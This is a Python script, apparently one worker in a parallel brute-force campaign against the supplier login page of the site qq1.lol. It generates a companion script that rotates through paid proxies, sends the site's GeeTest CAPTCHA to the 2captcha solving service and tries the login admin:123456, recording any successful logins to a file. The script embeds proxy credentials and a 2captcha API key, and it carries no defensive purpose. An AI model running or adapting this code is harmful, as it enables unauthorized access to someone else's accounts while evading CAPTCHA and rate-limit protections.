#!/usr/bin/env python3
"""Worker B — second half of users for parallel /sup brute."""
import os
os.environ.setdefault("SUP_TAG", "b")
# Import by exec with patched lists/paths
from pathlib import Path
import runpy
import sys

# Patch module before run: copy fast script with different OUT/USERS
src = Path("/tmp/qq1-sup-2captcha-fast.py").read_text()
src = src.replace('OUT = Path("/tmp/qq1_sup")', 'OUT = Path("/tmp/qq1_sup_b")')
src = src.replace(
    'USERS = [\n    "admin", "buyi", "buyiq", "qqkqq", "qq1", "sup", "supplier", "root",\n    "布衣", "faka", "test", "qqkzc", "agent", "daili", "vip", "user",\n    "demo", "administrator", "manager", "gonghuo", "gh", "super", "ka1",\n]',
    'USERS = [\n    "buyi", "buyiq", "qqkqq", "布衣", "qqkzc", "sup", "supplier", "faka",\n]',
)
Path("/tmp/qq1-sup-worker-b.py").write_text(src)
# also one-shot admin:123456
oneshot = r'''
import json,subprocess,time,urllib.parse
from pathlib import Path
BASE="https://qq1.lol"; QG,PW="C413ED6D","344F550A6F8B"; KEY="685ea1068774ca8f8e9a292a08da66d6"
OUT=Path("/tmp/qq1_sup"); JAR=str(OUT/"oneshot.jar")
d=json.loads(subprocess.check_output(["curl","-s",f"https://share.proxy.qg.net/query?key={QG}"],text=True))
px=None
for s in [x["server"] for x in d.get("data") or []]:
    cand=f"http://{QG}:{PW}@{s}"
    code=subprocess.run(["curl","-sk","--max-time","10","-x",cand,"-o","/tmp/t.out","-w","%{http_code}",f"{BASE}/%61pi.php?act=siteinfo"],capture_output=True,text=True,timeout=14).stdout.strip()
    if code=="200" and b"sitename" in open("/tmp/t.out","rb").read():
        px=cand; break
print("px",px)
def c(url,post=None):
    cmd=["curl","-sk","--max-time","16","-x",px,"-b",JAR,"-c",JAR,"-A","Mozilla/5.0","-H","Referer: https://qq1.lol/sup/login.php","-H","X-Requested-With: XMLHttpRequest","-w","\n__HTTP:%{http_code}"]
    if post is not None:
        cmd+=["-X","POST","--data-binary",urllib.parse.urlencode(post),"-H","Content-Type: application/x-www-form-urlencoded"]
    cmd.append(url)
    out=subprocess.run(cmd,capture_output=True,text=True,timeout=22).stdout or ""
    b,code=out.rsplit("__HTTP:",1); return b.strip()
Path(JAR).unlink(missing_ok=True)
c(BASE+"/sup/login.php")
cap=json.loads(c(f"{BASE}/ajax.php?act=captcha&t={int(time.time()*1000)}"))
print("gt ok", cap.get("gt","")[:12])
task={"type":"GeeTestTaskProxyless","websiteURL":BASE+"/sup/login.php","gt":cap["gt"],"challenge":cap["challenge"]}
tid=json.loads(subprocess.check_output(["curl","-s","-X","POST","-H","Content-Type: application/json","-d",json.dumps({"clientKey":KEY,"task":task}),"https://api.2captcha.com/createTask"],text=True))["taskId"]
print("task",tid)
sol=None
for i in range(30):
    time.sleep(4)
    d=json.loads(subprocess.check_output(["curl","-s","-X","POST","-H","Content-Type: application/json","-d",json.dumps({"clientKey":KEY,"taskId":tid}),"https://api.2captcha.com/getTaskResult"],text=True))
    if d.get("status")=="ready": sol=d["solution"]; break
print("sol", bool(sol))
body=c(BASE+"/sup/ajax.php?act=login",{"user":"admin","pass":"123456","geetest_challenge":sol["challenge"],"geetest_validate":sol["validate"],"geetest_seccode":sol.get("seccode") or sol["validate"]+"|jordan"})
print("LOGIN admin:123456", body)
if '"code":0' in body or "成功" in body:
    open(OUT/"sup_hits.txt","a").write("admin:123456\n"+body+"\n")
'''
Path("/tmp/qq1-sup-oneshot123456.py").write_text(oneshot)
print("written")
